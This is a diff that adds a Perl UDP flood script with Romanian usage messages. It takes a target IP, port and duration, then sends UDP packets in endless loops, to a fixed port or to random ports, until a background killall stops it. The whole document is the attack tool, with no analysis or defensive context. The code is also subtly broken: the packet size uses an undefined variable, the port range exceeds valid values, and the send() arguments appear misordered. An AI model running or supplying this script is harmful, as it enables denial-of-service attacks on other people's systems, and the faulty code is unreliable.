@@ -1,0 +1,42 @@
+#!/usr/bin/perl
+use Socket;
+$ARGC=@ARGV;
+if ($ARGC !=3) {
+printf "[0;31m* [0;32mFoloseste: [0;31m$0 <ip> <port> <time> [0;31m*[0m\n";
+exit(1);
+}
+my ($ip,$port,$size,$time);
+$ip=$ARGV[0];
+$port=$ARGV[1];
+$time=$ARGV[2];
+socket(crazy, PF_INET, SOCK_DGRAM, 17);
+$iaddr = inet_aton("$ip");
+
+
+printf "[1;35m#[1;33m#[1;31m*[0;32m Informatii flood: IP: [1;36m$ip[0;32m PORT: [1;36m$port[0;32m, TIMP: [1;36m$time[0m\n";
+
+if ($ARGV[1] ==0 && $ARGV[2] ==0) {
+goto randpackets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &");
+goto packets;
+}
+if ($ARGV[1] !=0 && $ARGV[2] ==0) {
+goto packets;
+}
+if ($ARGV[1] ==0 && $ARGV[2] !=0) {
+system("(sleep $time;killall -9 udp) &"); 
+goto randpackets;
+}
+packets:
+for (;;) {
+$size=$rand x $rand x $rand;
+send(crazy, 8, $size, sockaddr_in($port, $iaddr));
+}
+randpackets:
+for (;;) {
+$size=$rand x $rand x $rand;
+$port=int(rand 79500) +0;
+send(crazy, 0, $size, sockaddr_in($port, $iaddr));
+}
